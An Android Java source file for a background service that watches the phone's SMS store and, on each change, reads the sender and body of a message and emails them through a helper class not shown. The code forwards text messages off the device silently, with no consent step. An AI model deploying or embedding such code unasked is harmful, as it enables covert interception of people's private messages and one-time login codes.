package com.example.sms_email;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.view.View;
import android.view.ViewGroup;
import android.widget.CursorAdapter;

public class MyService extends Service {

	private String struri = "content://sms";
	private ContentResolver resolver = null;
	private String body = "";
	private String address = "";

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		resolver = getContentResolver();
		Cursor cursor = resolver.query(Uri.parse(struri), null, null, null,
				null);
		CursorAdapter adapter = new CursorAdapter(getBaseContext(), cursor,
				CursorAdapter.FLAG_REGISTER_CONTENT_OBSERVER) {

			@Override
			public View newView(Context arg0, Cursor arg1, ViewGroup arg2) {
				// TODO Auto-generated method stub
				return null;
			}

			@Override
			public void bindView(View arg0, Context arg1, Cursor arg2) {
				// TODO Auto-generated method stub

			}

			@Override
			protected void onContentChanged() {
				// TODO Auto-generated method stub
				super.onContentChanged();
				Cursor cursor = resolver.query(Uri.parse(struri), null, null,
						null, null);
				cursor.moveToFirst();
				address = cursor.getString(cursor.getColumnIndex("address"));
				body = cursor.getString(cursor.getColumnIndex("body"));
				new Thread(new Runnable() {
					
					@Override
					public void run() {
						// TODO Auto-generated method stub
						MySendEmailUtils.sendEmail(address , body);
						
					}
				}).start();
				
				
			}
		};
	}

}
